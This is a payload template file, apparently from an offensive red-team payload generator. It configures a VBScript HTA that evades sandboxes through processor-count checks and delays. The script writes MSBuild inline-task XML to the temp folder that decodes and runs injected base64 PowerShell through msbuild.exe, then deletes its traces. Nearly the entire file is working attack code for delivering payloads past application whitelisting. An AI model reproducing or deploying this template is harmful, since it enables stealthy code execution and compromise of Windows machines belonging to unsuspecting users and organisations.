[ShellCode]
value: notSet
process: pshEncode

[RedirectorDomain]
value: notSet

[RedirectorPort]
value: notSet

[Template]
data: 
 <script language=vbscript>
  On Error Resume Next

  Set objFSO = CreateObject("Scripting.FileSystemObject")
  Set objShell = CreateObject("WScript.Shell")
  objTemp = objShell.ExpandEnvironmentStrings("%%TEMP%%")
  objWindir = objShell.ExpandEnvironmentStrings("%%windir%%")
  Set objWMIService = GetObject("winmgmts:\\\\.\\root\CIMV2")
  arrUnicorns = Array("${ShellCode:value}")

  ' Get logical processor count
  Set colComputerSystem = objWMIService.ExecQuery("SELECT * FROM Win32_ComputerSystem")
  For Each objComputerSystem In colComputerSystem
    objProcessorCount = objComputerSystem.NumberofLogicalProcessors
  Next

  ' Only run if system has more than 1 processor
  ' https://www.trustedsec.com/may-2015/bypassing-virtualization-and-sandbox-technologies/
  If objProcessorCount > 1 Then
    ' Sleep 60 seconds
    ' https://www.sans.org/reading-room/whitepapers/malicious/sleeping-sandbox-35797
    objShell.Run "%%COMSPEC%% /c ping -n 60 127.0.0.1>nul", 0, 1

    For Each objUnicorn in arrUnicorns
      x = x + 1

      ' Create MSBuild XML File
      CreateMSBuildXML objUnicorn, x

      ' Execute resource(x).xml using msbuild.exe and nps
      objShell.Run objWindir & "\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe %%TEMP%%\\resource" & x & ".xml", 0
    Next

    ' Cleanup
    For y = 1 To x
      Do While objFSO.FileExists(objTemp & "\\resource" & y & ".xml")
        objShell.Run "%%COMSPEC%% /c ping -n 10 127.0.0.1>nul", 0, 1
        objFSO.DeleteFile(objTemp & "\\resource" & y & ".xml")
      Loop
    Next
  End If

  window.close()

  ' Creates XML configuration files in the %%TEMP%% directory
  Function CreateMSBuildXML(objUnicorn, x)
    msbuildXML = "<Project ToolsVersion=" & CHR(34) & "4.0" & CHR(34) & " xmlns=" & CHR(34) & "http://schemas.microsoft.com/developer/msbuild/2003" & CHR(34) & ">" & vbCrLf &_
    "  <!-- This inline task executes c# code. -->" & vbCrLf &_
    "  <!-- C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\msbuild.exe nps.xml -->" & vbCrLf &_
    "  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->" & vbCrLf &_
    "  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->" & vbCrLf &_
    "  <!-- License: BSD 3-Clause -->" & vbCrLf &_
    "  <Target Name=" & CHR(34) & "npscsharp" & CHR(34) & ">" & vbCrLf &_
    "   <nps />" & vbCrLf &_
    "  </Target>" & vbCrLf &_
    "  <UsingTask" & vbCrLf &_
    "    TaskName=" & CHR(34) & "nps" & CHR(34) & "" & vbCrLf &_
    "    TaskFactory=" & CHR(34) & "CodeTaskFactory" & CHR(34) & "" & vbCrLf &_
    "    AssemblyFile=" & CHR(34) & "C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" & CHR(34) & " >" & vbCrLf &_
    "  <Task>" & vbCrLf &_
    "    <Reference Include=" & CHR(34) & "System.Management.Automation" & CHR(34) & " />" & vbCrLf &_
    "      <Code Type=" & CHR(34) & "Class" & CHR(34) & " Language=" & CHR(34) & "cs" & CHR(34) & ">" & vbCrLf &_
    "        <![CDATA[" & vbCrLf &_
    "" & vbCrLf &_
    "          using System;" & vbCrLf &_
    "      using System.Collections.ObjectModel;" & vbCrLf &_
    "      using System.Management.Automation;" & vbCrLf &_
    "      using System.Management.Automation.Runspaces;" & vbCrLf &_
    "      using Microsoft.Build.Framework;" & vbCrLf &_
    "      using Microsoft.Build.Utilities;" & vbCrLf &_
    "" & vbCrLf &_
    "      public class nps : Task, ITask" & vbCrLf &_
    "        {" & vbCrLf &_
    "            public override bool Execute()" & vbCrLf &_
    "            {" & vbCrLf &_
    "              string cmd = " & CHR(34) & objUnicorn & CHR(34) & ";" & vbCrLf &_
    "              " & vbCrLf &_
    "                PowerShell ps = PowerShell.Create();" & vbCrLf &_
    "                ps.AddScript(Base64Decode(cmd));" & vbCrLf &_
    "" & vbCrLf &_
    "                Collection<PSObject> output = null;" & vbCrLf &_
    "                try" & vbCrLf &_
    "                {" & vbCrLf &_
    "                    output = ps.Invoke();" & vbCrLf &_
    "                }" & vbCrLf &_
    "                catch(Exception e)" & vbCrLf &_
    "                {" & vbCrLf &_
    "                    Console.WriteLine(" & CHR(34) & "Error while executing the script.\\r\\n" & CHR(34) & " + e.Message.ToString());" & vbCrLf &_
    "                }" & vbCrLf &_
    "                if (output != null)" & vbCrLf &_
    "                {" & vbCrLf &_
    "                    foreach (PSObject rtnItem in output)" & vbCrLf &_
    "                    {" & vbCrLf &_
    "                        Console.WriteLine(rtnItem.ToString());" & vbCrLf &_
    "                    }" & vbCrLf &_
    "                }" & vbCrLf &_
    "                return true;" & vbCrLf &_
    "            }" & vbCrLf &_
    "" & vbCrLf &_
    "            public static string Base64Encode(string text) {" & vbCrLf &_
    "           return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));" & vbCrLf &_
    "        }" & vbCrLf &_
    "" & vbCrLf &_
    "        public static string Base64Decode(string encodedtext) {" & vbCrLf &_
    "            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));" & vbCrLf &_
    "        }" & vbCrLf &_
    "        }" & vbCrLf &_
    "        ]]>" & vbCrLf &_
    "      </Code>" & vbCrLf &_
    "    </Task>" & vbCrLf &_
    "  </UsingTask>" & vbCrLf &_
    "</Project>"
    Set objFile = objFSO.CreateTextFile(objTemp & "\\resource" & x & ".xml", True)
    objFile.WriteLine(msbuildXML)
    objFile.Close
  End Function
 </script>